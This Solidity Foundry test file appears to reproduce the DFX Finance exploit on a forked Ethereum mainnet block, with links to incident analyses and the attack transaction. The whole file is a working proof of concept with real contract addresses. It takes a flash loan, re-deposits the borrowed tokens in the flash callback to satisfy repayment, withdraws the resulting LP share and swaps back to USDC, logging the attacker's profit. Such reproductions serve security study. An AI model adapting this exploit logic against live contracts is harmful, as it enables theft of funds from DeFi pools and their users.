// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1590960299246780417
// https://twitter.com/BeosinAlert/status/1591012525914861570
// https://twitter.com/AnciliaInc/status/1590839104731684865
// https://twitter.com/peckshield/status/1590831589004816384
// TX
// https://etherscan.io/tx/0x6bfd9e286e37061ed279e4f139fbc03c8bd707a2cdd15f7260549052cbba79b7

interface Curve {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
    function viewDeposit(uint256 _deposit) external view returns (uint256, uint256[] memory);
    function deposit(uint256 _deposit, uint256 _deadline) external returns (uint256, uint256[] memory);
    function withdraw(uint256 _curvesToBurn, uint256 _deadline) external;
}

contract ContractTest is Test {
    IERC20 XIDR = IERC20(0xebF2096E01455108bAdCbAF86cE30b6e5A72aa52);
    IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Router_V3 Router = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    Curve dfx = Curve(0x46161158b1947D9149E066d6d31AF1283b2d377C);
    uint256 receiption;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15_941_703);
    }

    function testExploit() public {
        address(WETH).call{value: 2 ether}("");
        WETH.approve(address(Router), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);
        USDC.approve(address(dfx), type(uint256).max);
        XIDR.approve(address(Router), type(uint256).max);
        XIDR.approve(address(dfx), type(uint256).max);

        WETHToUSDC();

        emit log_named_decimal_uint("[Before] Attacker USDC balance before exploit", USDC.balanceOf(address(this)), 6);

        USDCToXIDR();
        uint256[] memory XIDR_USDC = new uint[](2);
        XIDR_USDC[0] = 0;
        XIDR_USDC[1] = 0;
        (, XIDR_USDC) = dfx.viewDeposit(200_000 * 1e18);
        dfx.flash(address(this), XIDR_USDC[0] * 995 / 1000, XIDR_USDC[1] * 995 / 1000, new bytes(1)); // 5% fee
        dfx.withdraw(receiption, block.timestamp + 60);
        XIDRToUSDC();

        emit log_named_decimal_uint("[End] Attacker USDC balance after exploit", USDC.balanceOf(address(this)), 6);
    }

    function flashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        (receiption,) = dfx.deposit(200_000 * 1e18, block.timestamp + 60);
    }

    function WETHToUSDC() internal {
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(WETH),
            tokenOut: address(USDC),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: WETH.balanceOf(address(this)),
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Params);
    }

    function USDCToXIDR() internal {
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(USDC),
            tokenOut: address(XIDR),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: USDC.balanceOf(address(this)) / 2,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Params);
    }

    function XIDRToUSDC() internal {
        Uni_Router_V3.ExactInputSingleParams memory _Params = Uni_Router_V3.ExactInputSingleParams({
            tokenIn: address(XIDR),
            tokenOut: address(USDC),
            fee: 500,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: XIDR.balanceOf(address(this)) / 2,
            amountOutMinimum: 0,
            sqrtPriceLimitX96: 0
        });
        Router.exactInputSingle(_Params);
    }
}
